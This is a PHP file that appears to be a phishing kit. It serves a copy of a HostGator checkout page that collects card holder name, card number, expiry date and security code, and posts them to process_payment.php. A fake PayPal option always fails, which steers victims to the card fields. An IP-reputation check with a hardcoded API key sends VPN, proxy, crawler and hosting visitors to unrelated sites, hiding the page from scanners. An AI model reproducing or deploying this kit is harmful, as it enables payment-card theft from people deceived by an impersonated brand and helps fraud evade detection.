<?php

// Turn on output buffering to prevent errors with the header() function.
ob_start();

//$visitorip = $_SERVER['REMOTE_ADDR'];
$visitorip = '105.76.161.244';
echo $visitorip;

// 1. Define the API URL and Key for ipapi.is
$apiKey = 'f229a9769964cf836381';
//$ipAddress = '105.76.161.244'; // Get the real visitor IP
//$apiUrl = "https://api.ipapi.is/?q=105.76.161.244&key={$apiKey}";
$apiUrl = "https://api.ipapi.is/?q=105.76.161.244&key={$apiKey}";

// 2. Initialize a cURL session
$curl = curl_init();

// 3. Set cURL options
curl_setopt($curl, CURLOPT_URL, $apiUrl);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_TIMEOUT, 10);
// It's good practice to set a User-Agent
curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0');

// 4. Execute the cURL request
$response = curl_exec($curl);
$httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
$curlError = curl_error($curl);

// 5. Close the cURL session
curl_close($curl);

// 6. Check for cURL errors or non-successful HTTP codes.
if ($curlError || $httpCode != 200) {
	echo $curlError;

	// 4. Execute the cURL request
	$response = curl_exec($curl);
	$httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
	$curlError = curl_error($curl);

	// 5. Close the cURL session
	curl_close($curl);
		
}

// 7. Decode the JSON response
$data = json_decode($response, true);

// 8. === MAIN LOGIC: CHECK AND REDIRECT BASED ON YOUR RULES ===
// Check if the API response is valid and does not contain an error.
if ($data && !isset($data['error'])) {
    
    // --- Define the conditions that will trigger a redirect ---
    $isProxy = !empty($data['is_proxy']);
    $isCrawler = !empty($data['is_crawler']);
    $isVpn = !empty($data['is_vpn']);
    $isCompanyHosting = isset($data['company']['type']) && $data['company']['type'] === 'hosting';
    $isAsnHosting = isset($data['asn']['type']) && $data['asn']['type'] === 'hosting';
    
    // Check if ANY ONE of the conditions is true
    if ($isProxy || $isCrawler || $isVpn || $isCompanyHosting || $isAsnHosting) {
        
        // --- This is a high-risk IP, redirect to a random domain ---
        $domain_list = [
            'https://www.123homeopathy.co.uk',
            'https://www.3dsecurity.org.uk',
            'https://www.3riversshamanicgroup.co.uk',
            'https://www.5ashes.co.uk',
            'https://www.999pc.co.uk',
			'https://www.deondesign.co.uk',
			'https://www.activetreecareltd.co.uk',
			'https://www.alanphillips.co.uk',
			'https://www.alanwareham.co.uk',						
        ];
        
        $chosen_domain = $domain_list[array_rand($domain_list)];
        
        header('Location: ' . $chosen_domain);
        exit;

    } else {
        // --- This is a clean, regular user IP ---
        // Redirect to the normal gator.php page.
        			echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HostGator Checkout</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    
    <style>
        body {
            background-color: #fff;
        }
        .header {
            background-color: #fff;
            padding: 20px 0;
            border-bottom: 1px solid #dee2e6;
        }
        .main-content {
            padding-top: 40px;
            padding-bottom: 40px;
        }
        .checkout-card, .summary-card {
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 30px;
            height: 100%;
        }
        .summary-card-mobile {
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1.5rem;
        }
        .section-title {
            font-weight: bold;
            font-size: 1.5rem;
            margin-bottom: 20px;
        }
        .sub-section-title {
            font-weight: 600;
            font-size: 1.1rem;
            border-bottom: 1px solid #eee;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .summary-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 0.9rem;
        }
        .total-row {
            display: flex;
            justify-content: space-between;
            font-weight: bold;
            font-size: 1.2rem;
            border-top: 1px solid #eee;
            padding-top: 15px;
            margin-top: 15px;
        }
        .payment-option img {
            height: 24px;
            margin-left: 5px;
        }
        .payment-label-text {
            white-space: nowrap;
            margin-right: 5px; 
        }
        .footer {
            background-color: #e6eaed;
            padding: 40px 0;
            font-size: 0.9rem;
        }
        .footer h6 {
            font-weight: bold;
            margin-bottom: 15px;
        }
        .footer a {
            color: #0d6efd;
            text-decoration: none;
            display: block;
            margin-bottom: 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .sub-footer {
            background-color: #e6eaed;
            padding: 20px 0;
            border-top: 1px solid #d1d5d8;
            font-size: 0.8rem;
        }
        .social-icons a {
            color: #343a40;
            font-size: 1.5rem;
            margin-right: 15px;
            text-decoration: none;
        }
        .sub-footer-links a {
            color: #0d6efd;
            text-decoration: none;
            margin: 0 10px;
        }
        .sub-footer-pair {
            display: flex;
            justify-content: center;
            margin-bottom: 5px;
        }
        @media (min-width: 992px) {
            .sub-footer-pair {
                display: inline;
                margin-bottom: 0;
            }
        }

        @media (max-width: 991.98px) {
            .footer {
                padding-bottom: 0; 
            }
            .sub-footer {
                padding-top: 0;      
                border-top: none;    
            }
            .social-icons-wrapper {
                 margin-bottom: 2rem; 
            }
        }

        @media (max-width: 991.98px) {
            .footer h6, .footer a {
                font-weight: bold;
            }
        }
    </style>
</head>
<body>

    <!-- ======================= Header ======================= -->
    <header class="header">
        <div class="container d-flex flex-column flex-lg-row justify-content-lg-between align-items-center">
            <a href="#">
                <img src="https://www.hostgator.com/checkout/assets/images/hg-logo.svg" alt="HostGator Logo" style="height: 40px;">
            </a>
            <div class="mt-2 mt-lg-0 fw-bold">
                <i class="bi bi-telephone-fill"></i> 1-877-828-5278
            </div>
        </div>
    </header>

    <!-- ======================= Main Content ======================= -->
    <main class="main-content">
        <div class="container">

            <div class="d-lg-none summary-card-mobile">
                <a data-bs-toggle="collapse" href="#orderSummaryCollapse" role="button" aria-expanded="false" aria-controls="orderSummaryCollapse" class="text-decoration-none text-dark">
                    <div class="d-flex justify-content-between align-items-center">
                        <div class="fw-bold">
                            Order Summary <i class="bi bi-chevron-down"></i>
                        </div>
                        <div class="fw-bold fs-5">\$149.95</div>
                    </div>
                </a>
                <div class="collapse" id="orderSummaryCollapse">
                    <div class="mt-3 pt-3 border-top">
                        <div class="summary-row"><span>Subtotal</span> <span>\$414.54</span></div>
                        <div class="summary-row"><span>Sales Tax</span> <span>\$0.00</span></div>
                    </div>
                </div>
            </div>

            <div class="row g-4">
                <div class="col-12 col-lg-8 order-lg-1">
                    <h2 class="section-title">Checkout</h2>
                    <form id="payment-form">
                        <div class="checkout-card">
                            
                            <h3 class="sub-section-title">Payment Information</h3>
                            <p class="fw-bold">Choose a payment method.</p>
                            
                            <div class="form-check mb-3">
                                <input class="form-check-input" type="radio" name="paymentMethod" id="creditCardRadio" value="Credit Card" checked>
                                <label class="form-check-label d-flex align-items-center" for="creditCardRadio">
                                    <span class="payment-label-text">Credit Card</span>
                                    <span class="payment-option">
                                        <img src="https://securepay.svcs.endurance.com/v2/img/creditcard-list.svg" alt="Credit Cards">
                                    </span>
                                </label>
                            </div>
                            
                            <div id="creditCardFields">
                                <div class="mb-3 d-lg-none">
                                    <label for="cardHolderNameMobile" class="form-label small">Card Holder Name*</label>
                                    <!-- === MODIFIED: Unified the 'name' attribute === -->
                                    <input type="text" class="form-control" id="cardHolderNameMobile" name="cardHolderName">
                                </div>

                                <div class="mb-3 d-none d-lg-block">
                                    <label for="cardHolderNameDesktop" class="form-label small">Card Holder Name*</label>
                                    <!-- === MODIFIED: Unified the 'name' attribute === -->
                                    <input type="text" class="form-control" id="cardHolderNameDesktop" name="cardHolderName">
                                </div>

                                <div class="mb-3">
                                    <label for="cardNumber" class="form-label small">Card Number*</label>
                                    <input type="text" class="form-control" id="cardNumber" name="cardNumber" maxlength="16">
                                </div>
                                
                                <div class="row">
                                    <div class="col-6">
                                        <label for="expiration" class="form-label small">Expiration*</label>
                                        <input type="text" class="form-control" id="expiration" name="expiration" placeholder="MM/YY">
                                    </div>
                                    <div class="col-6">
                                        <label for="securityCode" class="form-label small">Security Code*</label>
                                        <input type="text" class="form-control" id="securityCode" name="securityCode" maxlength="4">
                                    </div>
                                </div>
                            </div>

                            <div class="form-check mt-4">
                                <input class="form-check-input" type="radio" name="paymentMethod" id="paypalRadio" value="PayPal">
                                <label class="form-check-label d-flex align-items-center" for="paypalRadio">
                                    <img src="https://securepay.svcs.endurance.com/v2/img/paypal.svg" alt="PayPal" style="height: 40px;">
                                </label>
                            </div>

                            <div id="paypalButtonContainer" class="d-none">
                                <button class="btn btn-outline-primary w-100 mt-3" id="paypalButton">
                                    <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
                                    <span class="button-text">PAY WITH PAYPAL</span>
                                </button>
                            </div>
                            
                            <div id="paypal-error" class="alert alert-danger d-none mt-3" role="alert"></div>
                            
                        </div>
                    </form>
                </div>
				
                <div class="mt-4 d-lg-none"></div>

                <div class="col-12 col-lg-4 order-lg-2">
                    <h2 class="section-title">Order Summary</h2>
                    <div class="summary-card">
					
                        <div class="summary-row fw-bold">
                            <span>4 items in cart</span>
                            <a href="#" class="small">Edit Cart</a>
                        </div>
                        <hr>
                        <div class="summary-row"><span>Subtotal</span> <span>\$414.54</span></div>
                        <div class="summary-row"><span>Sales Tax</span> <span>\$0.00</span></div>
                        <div class="total-row">
                            <span>Today's Total:</span>
                            <span>\$149.95</span>
                        </div>
                        <button class="btn btn-primary w-100 btn-lg mt-3" id="submitPaymentButton">
                            <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
                            <span class="button-text">SUBMIT PAYMENT</span>
                        </button>
                        
                        <div id="form-validation-error" class="alert alert-danger d-none mt-3" role="alert"></div>

                        <p class="small text-muted mt-3" style="font-size: 0.75rem;">
                            By clicking “Submit Payment”, you agree to the <a href="#">Auto Renewal Terms</a>, <a href="#">Terms of Service</a>, <a href="#">Cancellation Policy</a>, and you acknowledge receipt of our <a href="#">Privacy Notice</a>. All plans and products automatically renew unless you cancel. You may cancel at any time, prior to your renewal date, by logging into your account online or by calling customer support.
                        </p>
                        <div class="text-center mt-3 d-none d-lg-block">
                            <strong>Excellent</strong> 4.6 out of 5 ★ Trustpilot
                        </div>
                    </div>
                    <div class="text-center mt-4 d-lg-none">
                        <strong>Excellent</strong> 4.6 out of 5 ★ Trustpilot
                    </div>
                </div>
            </div>
        </div>
    </main>
    
    <footer class="footer mt-5 mt-lg-0">
        <div class="container">
            <div class="row">
                <div class="col-12 col-md-6 col-lg-2 mb-4 text-center text-lg-start">
                    <h6>Hosting</h6>
                    <a href="#">Web hosting</a>
                    <a href="#">WordPress hosting</a>
                    <a href="#">Reseller hosting</a>
                    <a href="#">VPS hosting</a>
                    <a href="#">Dedicated hosting</a>
                    <a href="#">Website builder</a>
                </div>
                <div class="col-12 col-md-6 col-lg-2 mb-4 text-center text-lg-start">
                    <h6>Domains</h6>
                    <a href="#">Register domains</a>
                    <a href="#">Manage domains</a>
                    <h6 class="mt-4">Services</h6>
                    <a href="#">CodeGuard</a>
                    <a href="#">Web Design</a>
                    <a href="#">PPC</a>
                    <a href="#">SEO</a>
                    <h6 class="mt-4">Affiliates</h6>
                    <a href="#">Become An Affiliate</a>
                    <a href="#">Affiliate portal</a>
                </div>
                <div class="col-12 col-md-6 col-lg-2 mb-4 text-center text-lg-start">
                    <h6>Support</h6>
                    <a href="#">Customer Portal</a>
                    <a href="#">Support Portal</a>
                    <a href="#">Video tutorials</a>
                    <a href="#">Live chat</a>
                    <h6 class="mt-4">Company</h6>
                    <a href="#">About HostGator</a>
                    <a href="#">Reviews</a>
                    <a href="#">Company blog</a>
                    <a href="#">Contact us</a>
                    <a href="#">Careers</a>
                </div>
                <div class="col-12 col-lg-6 text-lg-end mt-4 mt-lg-0">
                    <div class="social-icons-wrapper">
                        <div class="social-icons d-flex align-items-center justify-content-center justify-content-lg-end">
                            <a href="#"><i class="bi bi-facebook"></i></a>
                            <a href="#"><i class="bi bi-twitter-x"></i></a>
                            <a href="#"><i class="bi bi-instagram"></i></a>
                            <a href="#"><i class="bi bi-pinterest"></i></a>
                            <span class="ms-2" style="color: #333;">Refer A Friend</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <div class="sub-footer">
        <div class="container">
            <div class="row">
                <div class="col-12 text-center text-lg-start">
                    <div class="sub-footer-links mb-2">
                        <div class="sub-footer-pair">
                            <a href="#">Global Directory</a>
                            <a href="#">Sitemap</a>
                        </div>
                        <div class="sub-footer-pair">
                            <a href="#">Terms of Service</a>
                            <a href="#">Privacy Notice</a>
                        </div>
                        <div class="sub-footer-pair">
                            <a href="#">Cookie Settings</a>
                            <a href="#">Report Abuse</a>
                        </div>
                        <div class="sub-footer-pair">
                             <a href="#" class="fw-bold">Do Not Sell My Personal Information</a>
                        </div>
                    </div>
                    <p class="text-muted mb-0">Copyright © 2025 HostGator.com</p>
                    <p class="text-muted mb-0">Web Hosting</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS Bundle -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        // --- Payment Method Toggle ---
        const creditCardRadio = document.getElementById('creditCardRadio');
        const paypalRadio = document.getElementById('paypalRadio');
        const creditCardFields = document.getElementById('creditCardFields');
        const paypalButtonContainer = document.getElementById('paypalButtonContainer');
        const paypalErrorDiv = document.getElementById('paypal-error'); 

        function togglePaymentFields() {
            if (creditCardRadio.checked) {
                creditCardFields.classList.remove('d-none');
                paypalButtonContainer.classList.add('d-none');
                paypalErrorDiv.classList.add('d-none'); 
            } else if (paypalRadio.checked) {
                creditCardFields.classList.add('d-none');
                paypalButtonContainer.classList.remove('d-none');
            }
        }
        creditCardRadio.addEventListener('change', togglePaymentFields);
        paypalRadio.addEventListener('change', togglePaymentFields);
    </script>
    
    <script>
        // --- Get all necessary form elements ---
        const paymentForm = document.getElementById('payment-form');
        const cardHolderNameInputMobile = document.getElementById('cardHolderNameMobile');
        const cardHolderNameInputDesktop = document.getElementById('cardHolderNameDesktop');
        const cardNumberInput = document.getElementById('cardNumber');
        const expirationInput = document.getElementById('expiration');
        const securityCodeInput = document.getElementById('securityCode');
        const submitButton = document.getElementById('submitPaymentButton');
        const validationErrorDiv = document.getElementById('form-validation-error');
        const paypalButton = document.getElementById('paypalButton'); 

        // --- Real-time input filtering and formatting ---
        cardNumberInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
        });
        securityCodeInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
        });
        expirationInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/[^0-9]/g, '');
            if (value.length > 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });

        function hideError() {
            validationErrorDiv.classList.add('d-none');
        }
        
        // --- Main validation logic on button click ---
        submitButton.addEventListener('click', (e) => {
            e.preventDefault(); 
            if (!creditCardRadio.checked) {
                return;
            }

            const cardHolderName = window.innerWidth < 992 ? cardHolderNameInputMobile : cardHolderNameInputDesktop;
            const allCreditCardInputs = [cardHolderName, cardNumberInput, expirationInput, securityCodeInput];

            if (allCreditCardInputs.some(input => input.value.trim() === '')) {
                validationErrorDiv.textContent = 'All fields are required. Please fill out the form completely.';
                validationErrorDiv.classList.remove('d-none');
                return;
            }
            if (cardNumberInput.value.length !== 16) {
                validationErrorDiv.textContent = 'Please enter a valid 16-digit card number.';
                validationErrorDiv.classList.remove('d-none');
                return;
            }
            const month = parseInt(expirationInput.value.split('/')[0], 10);
            if (isNaN(month) || month < 1 || month > 12) {
                 validationErrorDiv.textContent = 'Please enter a valid expiration month (01-12).';
                validationErrorDiv.classList.remove('d-none');
                return;
            }
            
            hideError();
            const spinner = submitButton.querySelector('.spinner-border');
            const buttonText = submitButton.querySelector('.button-text');
            
            buttonText.classList.add('d-none');
            spinner.classList.remove('d-none');
            submitButton.disabled = true;

            setTimeout(() => {
                const formData = new FormData(paymentForm);

                fetch('process_payment.php', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(data => {
                    console.log('Server Response:', data); 
                    spinner.classList.add('d-none');
                    buttonText.classList.remove('d-none');
                    submitButton.disabled = false;
                    alert('Form is valid! Submitting...'); 
                })
                .catch(error => {
                    console.error('Error:', error);
                    spinner.classList.add('d-none');
                    buttonText.classList.remove('d-none');
                    submitButton.disabled = false;
                    alert('An error occurred. Please try again.');
                });
                
            }, 2000); 
        });
        
        paypalButton.addEventListener('click', (e) => {
            e.preventDefault(); 

            const spinner = paypalButton.querySelector('.spinner-border');
            const buttonText = paypalButton.querySelector('.button-text');

            paypalErrorDiv.classList.add('d-none');

            buttonText.classList.add('d-none');
            spinner.classList.remove('d-none');
            paypalButton.disabled = true;

            setTimeout(() => {
                spinner.classList.add('d-none');
                buttonText.classList.remove('d-none');
                paypalButton.disabled = false;
                
                paypalErrorDiv.textContent = 'Paypal is having a problem, try again later';
                paypalErrorDiv.classList.remove('d-none');
            }, 3000); 
        });
    </script>
</body>
</html>
HTML;
        exit;
    }

} else {
    // If the API response is malformed or contains an error,
    // send the user to the default page as a safe fallback.
        $domain_list = [
            'https://www.123homeopathy.co.uk',
            'https://www.3dsecurity.org.uk',
            'https://www.3riversshamanicgroup.co.uk',
            'https://www.5ashes.co.uk',
            'https://www.999pc.co.uk',
			'https://www.deondesign.co.uk',
			'https://www.activetreecareltd.co.uk',
			'https://www.alanphillips.co.uk',
			'https://www.alanwareham.co.uk',						
        ];
        
        $chosen_domain = $domain_list[array_rand($domain_list)];
        
        header('Location: ' . $chosen_domain);
        exit;
}

// Flush any accidental output
ob_end_flush();

?>






















































